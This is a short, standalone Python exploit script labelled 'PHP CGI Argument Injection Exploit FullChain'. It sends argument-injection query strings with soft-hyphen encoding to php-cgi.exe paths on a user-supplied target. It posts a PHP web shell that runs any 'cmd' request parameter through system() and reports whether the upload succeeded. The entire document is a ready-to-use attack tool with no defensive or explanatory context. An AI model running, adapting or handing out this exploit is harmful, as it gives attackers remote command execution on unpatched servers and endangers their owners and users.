import requests
import argparse

def upload_webshell(url):
    payloads = [
        '/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
        '/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
    ]
    
    webshell = '<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);} ?>'
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    for payload in payloads:
        shell_url = f"{url}{payload}"
        try:
            response = requests.post(shell_url, headers=headers, data=webshell)
            if response.status_code == 200:
                print(f"(+) Webshell uploaded at: {shell_url}")
            else:
                print(f"(-) Failed to upload webshell at: {shell_url}")
        except Exception as e:
            print(f"(!) Error uploading webshell to {shell_url}: {e}")

def main():
    parser = argparse.ArgumentParser(description="PHP CGI Argument Injection Exploit FullChain")
    parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
    args = parser.parse_args()
    
    target_url = args.target.rstrip('/')
    upload_webshell(target_url)

if __name__ == "__main__":
    main()
